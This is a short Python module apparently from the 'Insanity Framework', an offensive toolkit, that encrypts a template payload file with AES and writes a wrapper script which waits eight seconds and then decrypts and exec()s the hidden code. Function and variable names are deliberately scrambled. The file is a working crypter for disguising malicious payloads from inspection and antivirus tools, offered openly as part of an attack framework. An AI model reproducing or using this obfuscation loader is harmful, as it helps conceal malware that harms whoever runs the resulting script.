#!/usr/bin/env python
# -.- coding: utf-8 -.-
# Copyright 2017 Insanity Framework (IF) 
# Written by: * Alisson Moretto - 4w4k3
# https://github.com/4w4k3/Insanity-Framework
# Licensed under the BSD-3-Clause
from Crypto.Cipher import AES
from base64 import b64encode
import string
import random


random_string_payload = ''.join(random.sample((string.ascii_uppercase + string.digits), 32))
BLOCO = 32
PAD = '@'


def skdbksalnksancas(abdasbdio, chave):
    """ I don't really know what this does so I'm just gonna leave
    it how it is """
    extra = (BLOCO - len(abdasbdio)) % BLOCO
    aes = AES.new(chave, AES.MODE_ECB)
    crypt = aes.encrypt(abdasbdio + PAD * extra)
    return b64encode(crypt)


def create_payload_script(path, output, chave):
    """ Create the payload script """
    sahdvowhiohqwrqw = open(path, 'a+')
    abdasbdio = sahdvowhiohqwrqw.read()
    abdasbdio_cifrado = skdbksalnksancas(abdasbdio, chave)
    payload = "from Crypto.Cipher import AES\n"
    payload += "from base64 import b64decode\n"
    payload += "from time import sleep\n"
    payload += "\n\nsleep(8)\n"
    payload += "aes = AES.new('{}', AES.MODE_ECB)\n".format(chave)
    payload += "exec(aes.decrypt(b64decode('{}')).rstrip('{}'))".format(abdasbdio_cifrado, PAD)

    andasndaasa = open(output, 'a+')
    andasndaasa.write(payload)

    sahdvowhiohqwrqw.close()
    andasndaasa.close()


def main():
    """ Main function that calls all the rest """
    insane_template = 'Templates/Insane.py'
    insane_template_two = 'Templates/insane_enc.py'
    create_payload_script(
        insane_template,
        insane_template_two,
        random_string_payload
    )


if __name__ == '__main__':
    main()
